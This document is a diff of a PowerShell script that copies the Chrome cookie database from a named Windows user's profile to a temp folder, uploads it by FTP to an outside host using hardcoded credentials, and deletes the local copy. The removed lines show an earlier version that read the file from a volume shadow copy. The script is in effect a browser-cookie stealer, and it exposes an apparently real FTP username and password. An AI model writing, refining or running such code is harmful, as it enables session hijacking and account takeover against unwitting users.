@@ -1,53 +1,53 @@
-# Include necessary assemblies for FTP
-Add-Type -AssemblyName System.Net
-
 # FTP server details
 $FTP_HOST = "us-east-1.sftpcloud.io"
 $FTP_USERNAME = "d45b8e2d698147e59f2234fd87b98082"
 $FTP_PASSWORD = 'CHbEN9bcriLn1f8X5pBzc66ZZsgrIa3p'
 
-# Function to upload files to the FTP server
+# Directories to work with
+$source_directory_1 = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"
+$source_directory_2 = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"
+
+# FTP function to upload files, now directing files to /Cookies directory
 function Upload-ToFtp {
     param (
-        [String]$FilePath,
-        [String]$FileName
+        [String]$file_path,
+        [String]$file_name
     )
-    $FtpUrl = "ftp://$FTP_HOST/Cookies/$FileName"
-    $FtpRequest = [System.Net.FtpWebRequest]::Create($FtpUrl)
-    $FtpRequest.Credentials = New-Object System.Net.NetworkCredential($FTP_USERNAME, $FTP_PASSWORD)
-    $FtpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
-    $FtpRequest.UseBinary = $true
-    $FtpRequest.KeepAlive = $false
-    $Content = [System.IO.File]::ReadAllBytes($FilePath)
-    $FtpRequest.ContentLength = $Content.Length
-    $RequestStream = $FtpRequest.GetRequestStream()
-    $RequestStream.Write($Content, 0, $Content.Length)
-    $RequestStream.Close()
-    Write-Host "Uploaded $FileName to FTP in /Cookies."
+    # Load Assembly and create FTPWebRequest to /Cookies directory
+    $ftpUrl = "ftp://$FTP_HOST/Cookies/$file_name"
+    Add-Type -AssemblyName System.Net
+    $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUrl)
+    $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($FTP_USERNAME, $FTP_PASSWORD)
+    $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+    $ftpRequest.UseBinary = $true
+    $ftpRequest.KeepAlive = $false
+
+    # Read file content
+    $content = Get-Content -Path $file_path -Encoding Byte -ReadCount 0
+    $ftpRequest.ContentLength = $content.Length
+
+    # Get request stream and upload the file
+    $requestStream = $ftpRequest.GetRequestStream()
+    $requestStream.Write($content, 0, $content.Length)
+    $requestStream.Close()
+
+    Write-Host "Uploaded $file_name to FTP in /Cookies."
 }
 
-# Main script continues...
-# Assuming previous steps for creating shadow copy and identifying file to copy
-
-if ($shadowCopyPath) {
-    $sourceFilePath = Join-Path -Path $sourceDirectory -ChildPath $fileName
-    $targetFilePath = Join-Path -Path $targetDirectory -ChildPath $fileName
-
-    # Attempt to copy the file from the shadow copy to the target path
-    try {
-        Copy-FileFromShadow -ShadowCopyPath $shadowCopyPath -SourceFilePath $sourceFilePath -TargetFilePath $targetFilePath
-        Write-Host "File copied successfully from shadow copy to $targetFilePath"
-
-        # Proceed to upload the file to FTP
-        Upload-ToFtp -FilePath $targetFilePath -FileName $fileName
-    }
-    catch {
-        Write-Error "Failed to copy file from shadow copy: $_"
-    }
-    finally {
-        # Clean up the shadow copy to free up resources
-        Remove-ShadowCopy -ShadowCopyId $shadowCopyPath
-    }
+# Check if the first file exists, then copy and upload
+if (Test-Path $source_directory_1) {
+    $file_name = [System.IO.Path]::GetFileName($source_directory_1)
+    $temp_path = Join-Path -Path "C:\temp" -ChildPath $file_name
+    Copy-Item -Path $source_directory_1 -Destination $temp_path # Copy the file to a temporary location
+    Upload-ToFtp -file_path $temp_path -file_name $file_name # Upload the file from the temporary location to /Cookies
+    Remove-Item -Path $temp_path # Clean up the temporary file
 } else {
-    Write-Host "Could not create shadow copy."
+    Write-Host "The directory or file does not exist."
+}
+
+# Check for the second directory and ignore if it doesn't exist
+if (Test-Path $source_directory_2) {
+    Write-Host "Project2 directory exists." # Placeholder for actual actions
+} else {
+    Write-Host "Project2 folder does not exist, ignoring."
 }
